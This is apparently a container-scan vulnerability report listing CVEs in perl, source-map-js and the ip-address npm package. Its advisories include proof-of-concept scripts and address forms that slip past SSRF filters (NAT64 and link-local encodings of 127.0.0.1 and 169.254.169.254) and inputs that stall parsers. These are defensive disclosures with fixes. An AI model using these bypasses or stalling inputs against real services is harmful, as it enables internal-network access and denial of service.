<a href="https://scout.docker.com/v/CVE-2026-82560?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--82560" src="https://img.shields.io/badge/CVE--2026--82560-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.630%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Pod::Text versions before 6.1.1 for Perl allow CPU and memory exhaustion formatting a POD document whose =over nesting drives the margin to the output width.  Each =over adds its indent to the margin, which wrap() subtracts from the output width to get the space available for text. When that space reaches zero, the line-splitting substitution matches the empty string, and the loop consumes no input while appending the margin padding on every pass.  Formatting an attacker-supplied POD document never returns, and the output grows until memory is exhausted.

---
- perl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1148455)
[trixie] - perl <no-dsa> (Minor issue)
- podlators-perl <removed>
https://lists.security.metacpan.org/cve-announce/msg/43682367/
Fixed by: https://github.com/rra/podlators/commit/70510174f69eb54aa6d617bde4e1402cd9b7c61f (release/v6.1.1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-15534?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="medium : CVE--2026--15534" src="https://img.shields.io/badge/CVE--2026--15534-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.164%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Perl versions through 5.45.1 have out-of-bounds heap reads and writes during regular expression matching via an undersized superlinear cache in S_regmatch.  The regex engine's superlinear cache holds one bit per subject position for each participating WHILEM node, so the bit count is the subject length plus one times the number of nodes. Nothing checks that product for positive overflow of the signed 32-bit count: a 286331153 byte subject matched against a pattern with 15 participating nodes stores the count as 14, leaving a two byte cache. The cache is then indexed from the real match position and node number, so reads go past the end of the allocation, and on failure CACHEsayNO sets a bit past it.  A caller that matches an attacker controlled subject of this size against a pattern of this shape can crash the process or corrupt heap memory.

---
- perl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1144413)
[trixie] - perl <postponed> (Wait for exposure unstable and coordinate with Perl maintainers)
https://lists.security.metacpan.org/cve-announce/msg/42536248/
Fixed by: https://github.com/Perl/perl5/commit/568e6fd238867bb9e99fa3f47cba3169009239e0
Fixed by: https://github.com/Perl/perl5/commit/54cf3d44cbbedd17d774e9a37921963e8fd5d0cb

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31486?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31486" src="https://img.shields.io/badge/CVE--2023--31486-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.742%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HTTP::Tiny before 0.083, a Perl core module since 5.13.9 and available standalone on CPAN, has an insecure default TLS configuration where users must opt in to verify certificates.

---
- libhttp-tiny-perl 0.088-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=962407; unimportant)
[experimental] - perl 5.38.0~rc2-1
- perl 5.38.2-2 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=954089)
https://www.openwall.com/lists/oss-security/2023/04/18/14
https://github.com/chansen/p5-http-tiny/issues/134
https://blog.hackeriet.no/perl-http-tiny-insecure-tls-default-affects-cpan-modules/
https://hackeriet.github.io/cpan-http-tiny-overview/
Applications need to explicitly opt in to enable verification.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-4116?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2011--4116" src="https://img.shields.io/badge/CVE--2011--4116-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.524%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

_is_safe in the File::Temp module for Perl does not properly handle symlinks.

---
- perl <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=776268)
http://thread.gmane.org/gmane.comp.security.oss.general/6174/focus=6177
https://github.com/Perl-Toolchain-Gang/File-Temp/issues/14

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>source-map-js</strong> <code>1.0.2</code> (npm)</summary>

<small><code>pkg:npm/source-map-js@1.0.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-93749?s=github&n=source-map-js&t=npm&vr=%3E%3D1.0.0%2C%3C1.2.2"><img alt="high 8.7: CVE--2026--93749" src="https://img.shields.io/badge/CVE--2026--93749-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Improper Validation of Specified Quantity in Input</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0.0<br/><1.2.2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.455%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 5" src="https://img.shields.io/badge/M-5-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>ip-address</strong> <code>10.5.0</code> (npm)</summary>

<small><code>pkg:npm/ip-address@10.5.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-101910?s=github&n=ip-address&t=npm&vr=%3E%3D10.2.0%2C%3C%3D10.5.0"><img alt="medium 6.9: CVE--2026--101910" src="https://img.shields.io/badge/CVE--2026--101910-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Server-Side Request Forgery (SSRF)</i>

<table>
<tr><td>Affected range</td><td><code>>=10.2.0<br/><=10.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.5.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:H/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.386%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

No classifier on `Address6` recognizes the NAT64 local-use range `64:ff9b:1::/48` (RFC 8215). `isPrivate()`, `isLoopback()`, `isLinkLocal()` and their siblings all return `false` for every address in it, so an internal IPv4 destination written through a local-use NAT64 prefix (`64:ff9b:1:7f00:0:100::` for `127.0.0.1`, `64:ff9b:1:a9fe:a9:fe00::` for `169.254.169.254`) reads as an ordinary global address. `getType()` names the range `'NAT64 (local-use)'`, so the library knows what the address is and classifies it as nothing.

An application that builds a network trust-boundary decision on these checks (for example a filter intended to block Server-Side Request Forgery, or SSRF) will classify an internal target as external and allow the request. SSRF is an attack in which a user-supplied address coaxes the server into making a request to an internal destination the user could not otherwise reach, such as a loopback service or a cloud metadata endpoint.

### Details

The fix for GHSA-22jq-vg5j-6vgg (10.2.1) classifies IPv4-mapped (`::ffff:0:0/96`) and NAT64 well-known (`64:ff9b::/96`) addresses by their embedded IPv4 address: `embeddedIPv4()` in `src/ipv6.ts` decodes the trailing 32 bits and every special-use classifier delegates to the resulting `Address4`. Those are the only two ranges `embeddedIPv4()` handles.

The local-use range differs in kind from the well-known prefix, which is why extending the decoder does not fix it. RFC 8215 reserves `64:ff9b:1::/48` so an operator can carve their own NAT64 prefix out of it, of any length RFC 6052 allows (`/48`, `/56`, `/64`, or `/96`). Where the IPv4 address sits depends on that choice: `127.0.0.1` is `64:ff9b:1:7f00:0:100::` under a `/48` prefix and `64:ff9b:1::7f00:1` under a `/96` prefix, and each of those decodes to a different address under the other prefix length. There is no single embedded IPv4 address for the library to classify by.

What is well-defined is the range as a whole. The IANA IPv6 Special-Purpose Address Registry lists `64:ff9b:1::/48` as not globally reachable, and Python's `ipaddress` module reports `is_private` as `True` and `is_global` as `False` for every address in it. `isPrivate()` covered ULA (`fc00::/7`) plus the decoded mapped and well-known cases, and nothing in the local-use range.

### Affected versions

`>= 10.2.0, <= 10.5.0`. The `is*` classification API was extended to `Address6` in 10.2.0; releases before it do not expose the method and are not affected through this vector.

### Impact

Every address in `64:ff9b:1::/48` parses successfully, `isValid()` is `true`, and no classifier catches it. Which internal target is reached depends on the NAT64 prefix deployed on the server's network; the well-known prefix column is the patched control from GHSA-22jq-vg5j-6vgg.

| Internal target | Well-known form | Classified | Local-use form (`/48` prefix) | Classified |
|---|---|---|---|---|
| `127.0.0.1` | `64:ff9b::7f00:1` | loopback | `64:ff9b:1:7f00:0:100::` | nothing |
| `10.0.0.1` | `64:ff9b::a00:1` | private | `64:ff9b:1:a00:0:100::` | nothing |
| `169.254.169.254` | `64:ff9b::a9fe:a9fe` | link-local | `64:ff9b:1:a9fe:a9:fe00::` | nothing |
| `192.168.1.1` | `64:ff9b::c0a8:101` | private | `64:ff9b:1:c0a8:1:100::` | nothing |

### Reachability

Reaching an internal host through one of these addresses requires that the server's network run a NAT64 translator on a prefix inside `64:ff9b:1::/48` and that the attacker guess or know the prefix length. That is the same precondition the well-known prefix carries (a translator on `64:ff9b::/96`), with the additional constraint that the prefix is operator-chosen rather than fixed. The severity reflects that precondition.

### Proof of concept

`npm i ip-address@<!-- -->10.5.0`, then:

```js
const { Address6 } = require('ip-address');

// A guard of the shape the library documents.
function isBlocked(host) {
  const a = new Address6(host);
  return a.isLoopback() || a.isLinkLocal() || a.isPrivate() || a.isMulticast() || a.isUnspecified();
}

for (const h of ['64:ff9b::7f00:1', '64:ff9b:1:7f00:0:100::', '64:ff9b:1::7f00:1']) {
  console.log(isBlocked(h) ? 'BLOCK' : 'ALLOW', h, '-> getType()', new Address6(h).getType());
}
```

On affected versions:

```
BLOCK 64:ff9b::7f00:1 -> getType() NAT64 (well-known)
ALLOW 64:ff9b:1:7f00:0:100:: -> getType() NAT64 (local-use)
ALLOW 64:ff9b:1::7f00:1 -> getType() NAT64 (local-use)
```

### Remediation

Upgrade to the patched release. In the fix, `isPrivate()` returns `true` for every address in `64:ff9b:1::/48`, alongside ULA and the decoded mapped and well-known cases. The range is reported private as a whole rather than by a decoded IPv4 address, for the reason given above; `toAddress4Nat64(prefix)` remains the way to decode an address under a known deployment prefix. `isLoopback()` and `isLinkLocal()` are unchanged for this range, since without the prefix length the library cannot know which IPv4 address is embedded.

If you cannot upgrade immediately, test the range directly:

```js
const NAT64_LOCAL_USE = new Address6('64:ff9b:1::/48');
const localUse = new Address6(host).isHostInSubnet(NAT64_LOCAL_USE);
```

### A note on SSRF defense

These methods are address classifiers, not a complete SSRF defense. Regardless of this fix, a robust SSRF guard must resolve the hostname and validate the *resolved* IP against the socket it connects to, and account for DNS rebinding and redirects. Treat these checks as one layer, not the only one.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-111997?s=github&n=ip-address&t=npm&vr=%3C%3D10.7.3"><img alt="medium 6.3: CVE--2026--111997" src="https://img.shields.io/badge/CVE--2026--111997-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code><=10.7.3</code></td></tr>
<tr><td>Fixed version</td><td><code>10.7.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.315%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`new Address6()` and `Address6.isValid()` strip a zone identifier with the pattern `/%.*$/` before they apply the 45-character length limit. When the string holds many `%` characters followed by a line terminator, the pattern is retried from every `%` and each attempt scans to the line terminator before failing, so rejecting the string takes time proportional to the square of its length. 10,000 `%` characters and a newline take 41 ms, 40,000 take 632 ms and 100,000 take 3.9 s of synchronous work. The same strings without the newline are rejected in under a millisecond.

An application that validates an attacker-supplied string with these methods can be stalled by a single long request. The input is rejected with the correct `AddressError`; the cost of reaching that rejection is the defect.

### Details

The constructor in `src/ipv6.ts` removes the CIDR suffix, then the zone, then checks the length of what is left:

```ts
const zone = constants6.RE_ZONE_STRING.exec(address);

if (zone) {
  this.zone = zone[0];

  address = address.replace(constants6.RE_ZONE_STRING, '');
}

const longest = this.groups * 5 + 5;

if (address.length > longest) {
  throw new AddressError(`IPv6 addresses are at most ${longest} characters.`);
}
```

`RE_ZONE_STRING` is `/%.*$/`. It has no anchor at its start, `.` does not match a line terminator (`\n`, `\r`, U+2028 or U+2029), and without the `m` flag `$` matches only at the end of the input. For `%` repeated N times and then `\n`, the engine starts a match at the first `%`, `.*` consumes the remaining `%` characters up to the newline, `$` fails there, and backtracking through every shorter `.*` fails too. The engine then starts again at the second `%`, and so on: N starts, each proportional to N. The length limit that follows rejects the string in constant time, after the scan has already run.

The line terminator need not be last. Any string in which many `%` characters precede a line terminator behaves the same way.

Every entry point that passes a caller's string to the `Address6` constructor is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromWildcard()` rejects a `%` before it constructs anything, `fromURL()` admits only hex digits, colons and dots in a host, and `fromArpa()` checks the nibble grammar first, so those three are unaffected. `Address4` has no zone and is unaffected.

### Affected versions

`<= 10.7.3`. The zone pattern has been in the constructor since 1.0.0; 5.9.4, 9.0.5 and 10.7.0 show the same timings as 10.7.3.

### Impact

`Address6.isValid()` on N `%` characters and a newline, measured on ip-address 10.7.3 and node 24.21.0:

| Input | Wall time | Same length of `!` |
|---|---|---|
| 5,461 characters | 13 ms | 0.1 ms |
| 16 KiB | 108 ms | 0.1 ms |
| 100 KB | 3.9 s | 0.1 ms |
| 256 KiB | 27 s | 0.2 ms |

The parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. No memory is retained and the process resumes when the call returns.

### Reachability

The input needs a line terminator after the `%` characters, which decides where it can arrive. An HTTP header value cannot carry a carriage return or a line feed, so a host or address taken from a header does not reach this. A URL can carry both characters percent-encoded at three bytes each, and Node's default 16 KB limit on the request line and headers admits about 5,461 of them: 13 ms. A request body is where the larger sizes come from. Common body parsers default to between 100 KB and 1 MB, and at 100 KB one field passed to the parser unchecked blocks the process for 3.9 s.

### Proof of concept

`npm i ip-address@<!-- -->10.7.3`, then:

```js
const { Address6 } = require('ip-address');

function time(input) {
  const start = process.hrtime.bigint();

  Address6.isValid(input);

  return `${(Number(process.hrtime.bigint() - start) / 1e6).toFixed(1)} ms`;
}

for (const n of [10000, 20000, 40000, 100000]) {
  console.log(`${n}: ${time(`${'%'.repeat(n)}\n`)}, without the newline ${time('%'.repeat(n))}`);
}
```

On affected versions (node 24.21.0):

```
10000: 41.0 ms, without the newline 0.0 ms
20000: 161.1 ms, without the newline 0.0 ms
40000: 632.4 ms, without the newline 0.1 ms
100000: 3899.8 ms, without the newline 0.1 ms
```

Each doubling of the input multiplies the time by four.

### Remediation

Upgrade to the patched release. In the fix, the constructor finds the zone by the index of the first `%` and accepts the remainder as a zone only when it holds no line terminator, which reads the input once. 1 MiB of the input above is rejected in about a millisecond. Every address that parsed before parses to the same result, and a string with a line terminator after a `%` is rejected as it was.

`RE_ZONE_STRING` stays exported from `v6/constants` for code that imports it directly and is marked `@<!-- -->deprecated`; the library itself does not call it.

If you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:

```js
if (host.length > 64) throw new Error('not an IP address');
```

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-101913?s=github&n=ip-address&t=npm&vr=%3C%3D10.5.0"><img alt="medium 6.3: CVE--2026--101913" src="https://img.shields.io/badge/CVE--2026--101913-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Incorrect Comparison</i>

<table>
<tr><td>Affected range</td><td><code><=10.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.5.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.386%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`Address6.isLinkLocal()` recognizes `fe80::/64` rather than `fe80::/10`. Link-local unicast is the whole `/10` under RFC 4291 §2.4 and the IANA IPv6 Special-Purpose Address Registry, so the method returns `false` for every link-local address outside the one `/64` that stateless address autoconfiguration happens to use. `new Address6('fe81::1').isLinkLocal()` is `false`.

The library contradicts itself on the same object: for `fe81::1`, `getType()` returns `'Link-local unicast'`, `getScope()` returns `'Link local'`, and `isHostInSubnet(new Address6('fe80::/10'))` returns `true`, while `isLinkLocal()` returns `false`.

An application that builds a network trust-boundary decision on these checks (for example a filter intended to block Server-Side Request Forgery, or SSRF) will classify a link-local target as unremarkable and allow the request. SSRF is an attack in which a user-supplied address coaxes the server into making a request to an internal destination the user could not otherwise reach.

### Details

`isLinkLocal()` in `src/ipv6.ts` compares the first 64 bits of the address against a literal string:

```ts
// Zeroes are required, i.e. we can't check isHostInSubnet with 'fe80::/10'
if (
  this.getBitsBase2(0, 64) ===
  '1111111010000000000000000000000000000000000000000000000000000000'
) {
  return true;
}
```

The comparison requires the first 64 bits to be exactly `fe80:0000:0000:0000`, so it accepts 2⁶⁴ of the 2¹¹⁸ addresses in `fe80::/10`. The comment states a premise the library disproves: `getType()` classifies the same range with `isHostInSubnet` against the `'fe80::/10': 'Link-local unicast'` entry in `src/v6/constants.ts`, and `Address4.isLinkLocal()` is a plain `isHostInSubnet` test against `169.254.0.0/16`. RFC 4291 §2.5.6 constrains the format of an autoconfigured link-local address; it does not define the range, and reading it as the definition is the likeliest origin of the `/64` comparison.

The IPv4-mapped and NAT64 well-known paths of `isLinkLocal()` are unaffected: `::ffff:169.254.169.254` and `64:ff9b::a9fe:a9fe` are classified by their embedded IPv4 address and report `true`.

### Affected versions

`<= 10.5.0`. The comparison has had this shape since `Address6.isLinkLocal()` was introduced, so every release exposing the method is affected.

### Impact

Every well-formed address in `fe80::/10` outside `fe80::/64` is parsed successfully, `isValid()` is `true`, and the classifier reports something untrue about it. No other classifier catches these addresses: `isPrivate()` covers ULA (`fc00::/7`), not link-local.

| Address | `isLinkLocal()` | `getType()` | `getScope()` |
|---|---|---|---|
| `fe80::1` | `true` | Link-local unicast | Link local |
| `fe81::1` | `false` | Link-local unicast | Link local |
| `fe8f::1` | `false` | Link-local unicast | Link local |
| `febf::1` | `false` | Link-local unicast | Link local |
| `fe80:0:0:1::1` | `false` | Link-local unicast | Link local |
| `fe80::1:0:0:0:1` | `false` | Link-local unicast | Link local |

Python's `ipaddress` module, the `IN6_IS_ADDR_LINKLOCAL` macro in `netinet6/in6.h`, and Linux's `ipv6_addr_type()` all apply a ten-bit prefix test and classify every row above as link-local.

A request admitted through a guard built on `isLinkLocal()` reaches a link-local host on the server's own segment: a neighboring machine or the on-link router. An IPv6 link-local destination generally needs a zone index and a neighbor on the same link, so the reach is the server's own segment rather than the internet or a universal metadata endpoint, and the severity reflects that.

### Proof of concept

`npm i ip-address@<!-- -->10.5.0`, then:

```js
const { Address6 } = require('ip-address');

// A guard of the shape the library documents.
function isBlocked(host) {
  const a = new Address6(host);
  return a.isLoopback() || a.isLinkLocal() || a.isPrivate() || a.isMulticast() || a.isUnspecified();
}

for (const h of ['fe80::1', 'fe81::1', 'febf::1', 'fe80:0:0:1::1']) {
  const a = new Address6(h);
  console.log(isBlocked(h) ? 'BLOCK' : 'ALLOW', h, '-> getType()', a.getType());
}
```

On affected versions:

```
BLOCK fe80::1 -> getType() Link-local unicast
ALLOW fe81::1 -> getType() Link-local unicast
ALLOW febf::1 -> getType() Link-local unicast
ALLOW fe80:0:0:1::1 -> getType() Link-local unicast
```

### Remediation

Upgrade to the patched release. In the fix, `isLinkLocal()` tests the address against `fe80::/10` with the same `isHostInSubnet` predicate `getType()` and `Address4.isLinkLocal()` use. The same release adds `2001::/32` to the type table so `getType()` reports `'Teredo'` for the addresses `isTeredo()` returns `true` for; that is a consistency correction with no security effect.

If you cannot upgrade immediately, test the range directly:

```js
const LINK_LOCAL = new Address6('fe80::/10');
const linkLocal = new Address6(host).isHostInSubnet(LINK_LOCAL);
```

### A note on SSRF defense

These methods are address classifiers, not a complete SSRF defense. Regardless of this fix, a robust SSRF guard must resolve the hostname and validate the *resolved* IP against the socket it connects to, and account for DNS rebinding and redirects. Treat these checks as one layer, not the only one.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-101912?s=github&n=ip-address&t=npm&vr=%3C%3D10.7.0"><img alt="medium 6.3: CVE--2026--101912" src="https://img.shields.io/badge/CVE--2026--101912-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Incorrect Comparison</i>

<table>
<tr><td>Affected range</td><td><code><=10.7.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.7.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.370%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`isInSubnet()` and `isHostInSubnet()` accept an address of either family and compare masked binary strings without checking that both operands are the same family. `Address4` pads to 32 bits and `Address6` to 128, so whenever the leading bits agree the strings are equal: `new Address6('a00::1').isInSubnet(new Address4('10.0.0.0/8'))` is `true`, and `new Address4('32.0.0.1').isInSubnet(new Address6('2000::/3'))` is `true`. No IPv4 address is inside an IPv6 network, so both answers are untrue.

An application that parses untrusted input as whichever family accepts it and then tests the result against a fixed-family allowlist can admit an address outside the list.

### Details

Both methods are in `src/common.ts`:

```ts
export function isInSubnet(this: Address4 | Address6, address: Address4 | Address6) {
  if (this.subnetMask < address.subnetMask) {
    return false;
  }

  return isHostInSubnet.call(this, address);
}

export function isHostInSubnet(this: Address4 | Address6, address: Address4 | Address6) {
  return this.mask(address.subnetMask) === address.mask();
}
```

`mask(n)` returns the first `n` bits of the address as a string of `0` and `1`, taken from a representation padded to the family's width. `new Address6('a00::1').mask(8)` is `'00001010'`, and so is `new Address4('10.0.0.0/8').mask()`, so string equality reports containment. The signature admits either family on either side, so TypeScript raises nothing, and the `v4` property on `Address6` marks IPv4 notation (`::ffff:10.0.0.1`) rather than family, so it does not discriminate either.

Which cross-family pairs coincide depends on the network's prefix length. `mask(n)` on an `Address4` returns at most 32 bits, so an IPv6 network longer than `/32` never matches an IPv4 address, and an IPv6 network of `/32` or shorter matches exactly the IPv4 addresses whose leading bits equal its prefix. An IPv4 network is at most 32 bits and matches every IPv6 address whose leading bits equal its prefix.

### Affected versions

`<= 10.7.0`. The comparison has had this shape since the methods were written, so every release is affected.

### Impact

| Expression | Result | Reason |
|---|---|---|
| `new Address6('a00::1').isInSubnet(new Address4('10.0.0.0/8'))` | `true` | both mask to `00001010` |
| `new Address4('10.0.0.1').isInSubnet(new Address6('a00::/8'))` | `true` | the same bits, reversed |
| `new Address4('32.0.0.1').isInSubnet(new Address6('2000::/3'))` | `true` | both begin `001` |
| `new Address4('32.1.13.184').isInSubnet(new Address6('2001:db8::/32'))` | `true` | the `/32` spells an IPv4 address |
| `new Address6('cb00:7100::1').isInSubnet(new Address4('203.0.113.0/24'))` | `true` | the `/24` spells an IPv6 prefix |
| `new Address4('10.0.0.1').isInSubnet(new Address6('::ffff:10.0.0.0/104'))` | `false` | `/104` is longer than 32 bits |
| `new Address4('8.8.8.8').isInSubnet(new Address4('10.0.0.0/8'))` | `false` | same-family control |

In the allowlist direction the check admits an address outside the list; in the denylist direction it blocks an address outside the list. What the coincidence can admit is narrow. An IPv6 allowlist of `/32` or shorter admits the IPv4 addresses its prefix spells: `2001:db8::/32` admits exactly `32.1.13.184`, and `2000::/3` admits `32.0.0.0/3`. Those are public IPv4 addresses; the private, loopback, and link-local ranges begin with bit patterns no allocated IPv6 prefix shares. An IPv4 allowlist admits the IPv6 addresses its prefix spells, and those all sit in blocks IANA has not allocated. So a request admitted through this defect reaches an address outside the intended list, not an internal host, and the severity reflects that.

### Proof of concept

`npm i ip-address@<!-- -->10.7.0`, then:

```js
const { Address4, Address6 } = require('ip-address');

// An allowlist of the application's own IPv6 range, tested against whichever
// family the input parses as.
const allowed = new Address6('2001:db8::/32');

function parse(host) {
  return Address4.isValid(host) ? new Address4(host) : new Address6(host);
}

for (const h of ['2001:db8::1', '2001:db9::1', '32.1.13.184', '32.1.13.185']) {
  console.log(parse(h).isInSubnet(allowed) ? 'ALLOW' : 'BLOCK', h);
}
```

On affected versions:

```
ALLOW 2001:db8::1
BLOCK 2001:db9::1
ALLOW 32.1.13.184
BLOCK 32.1.13.185
```

The IPv6 rows are right. The IPv4 address whose 32 bits equal the allowlist's prefix is admitted; the one next to it is not.

### Remediation

Upgrade to the patched release. In the fix, `isHostInSubnet()` returns `false` when the two addresses are of different families, and `isInSubnet()` inherits the answer. The methods keep accepting either family so existing call sites compile. A caller that means to compare across families converts first, with `Address6.fromAddress4()`, `to4()`, or `toAddress4Nat64()`: `new Address6('::ffff:10.0.0.1').to4().isInSubnet(new Address4('10.0.0.0/8'))` is `true`, as before.

If you cannot upgrade immediately, compare the classes before you compare the addresses:

```js
const contained = host.constructor === network.constructor && host.isInSubnet(network);
```

### A note on SSRF defense

These methods are address classifiers, not a complete SSRF defense. Regardless of this fix, a robust SSRF guard must resolve the hostname and validate the *resolved* IP against the socket it connects to, and account for DNS rebinding and redirects. Treat these checks as one layer, not the only one.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-101911?s=github&n=ip-address&t=npm&vr=%3C%3D10.7.0"><img alt="medium 6.3: CVE--2026--101911" src="https://img.shields.io/badge/CVE--2026--101911-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><=10.7.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.7.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.383%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`new Address6()` and `Address6.isValid()` place no bound on the length of the string they parse. When the string contains a character that cannot appear in an IPv6 address, the parser builds a diagnostic that wraps every such character in a 34-byte `<span class="parse-error">`, so the work and the memory scale with the input rather than with an address. A 1 MiB string of `!` costs about 110 MB and 70 ms of synchronous work, 8 MiB costs about 800 MB and half a second, 16 MiB throws a `RangeError` in place of the documented `AddressError`, and 32 MiB aborts the Node process. `isValid()` builds the diagnostic and discards it, so a caller that only asks whether a string is valid pays the full price.

An application that validates an attacker-supplied string with these methods can be stalled or crashed by a single oversized request. This is a crash on input that should have been rejected cleanly, which SECURITY.md lists as in scope.

### Details

`parse()` in `src/ipv6.ts` checks for characters outside `[0-9a-f:/%]` and, on finding any, throws an `AddressError` whose `parseMessage` is the whole input with each offending character wrapped:

```ts
const badCharacters = address.match(constants6.RE_BAD_CHARACTERS);

if (badCharacters) {
  throw new AddressError(
